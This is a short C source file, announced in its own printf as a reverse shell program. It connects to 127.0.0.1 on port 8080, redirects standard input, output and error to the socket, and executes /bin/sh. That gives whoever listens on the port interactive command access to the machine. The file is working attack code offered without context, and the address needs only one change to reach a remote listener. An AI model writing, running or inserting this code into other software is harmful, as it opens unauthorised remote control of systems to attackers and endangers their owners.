#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>

 int main() {
 
  printf("This is a reverse shell program\n");
  struct sockaddr_in addr;

   memset(&addr, 0, sizeof(addr));
  addr.sin_family = AF_INET;
  addr.sin_port = htons(8080);
 
  if(inet_pton(AF_INET, "127.0.0.1", &addr.sin_addr) <= 0) {
    perror("Invalid address");
    return 1;
  }
 
  int socketfd = socket(AF_INET, SOCK_STREAM, 0);
   if(connect(socketfd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
      perror("Connection failed");
   
   }
 
  dup2(socketfd, 0);
  dup2(socketfd, 1);
  dup2(socketfd, 2);

 char *args[] = {"/bin/sh", NULL};
 execve("/bin/sh", args, NULL);

 }









